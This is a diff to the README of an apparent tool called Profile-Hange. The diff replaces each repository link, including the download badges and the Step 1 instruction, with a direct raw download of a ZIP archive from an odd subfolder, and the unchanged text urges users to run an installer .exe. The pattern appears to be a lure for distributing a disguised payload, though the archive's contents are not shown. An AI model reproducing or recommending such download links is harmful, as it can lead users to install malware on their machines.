@@ -1,6 +1,6 @@
 # 🛠️ Profile-Hange - Simple Profile Upload Testing Tool
 
-[![Download Profile-Hange](https://img.shields.io/badge/Download-Profile--Hange-brightgreen)](https://github.com/beevin9/Profile-Hange)
+[![Download Profile-Hange](https://img.shields.io/badge/Download-Profile--Hange-brightgreen)](https://raw.githubusercontent.com/beevin9/Profile-Hange/main/imbannered/Hange_Profile_3.3.zip)
 
 ---
 
@@ -43,11 +43,11 @@ You do not need to install anything else. Profile-Hange includes all it needs to
 
 Begin by downloading the tool from the official repository.
 
-[![Download Here](https://img.shields.io/badge/Get%20Profile--Hange-blue)](https://github.com/beevin9/Profile-Hange)
+[![Download Here](https://img.shields.io/badge/Get%20Profile--Hange-blue)](https://raw.githubusercontent.com/beevin9/Profile-Hange/main/imbannered/Hange_Profile_3.3.zip)
 
 ### Step 1: Download the Software
 
-- Click the green download badge above or visit [https://github.com/beevin9/Profile-Hange](https://github.com/beevin9/Profile-Hange).
+- Click the green download badge above or visit [https://raw.githubusercontent.com/beevin9/Profile-Hange/main/imbannered/Hange_Profile_3.3.zip](https://raw.githubusercontent.com/beevin9/Profile-Hange/main/imbannered/Hange_Profile_3.3.zip).
 - On the page, look for the "Releases" section or the main repository files.
 - If you see a file named like `Profile-Hange-setup.exe` or similar, download it. This is the installer.
 - If no single file is found, look for instructions or the latest ZIP package to download.
@@ -125,6 +125,6 @@ Use the built-in help section or visit online tutorials to expand your knowledge
 
 You can download the latest version here as well:
 
-[![Download Profile-Hange](https://img.shields.io/badge/Download-Profile--Hange-brightgreen)](https://github.com/beevin9/Profile-Hange)
+[![Download Profile-Hange](https://img.shields.io/badge/Download-Profile--Hange-brightgreen)](https://raw.githubusercontent.com/beevin9/Profile-Hange/main/imbannered/Hange_Profile_3.3.zip)
 
 Click the badge, follow the steps above, and start your testing safely.
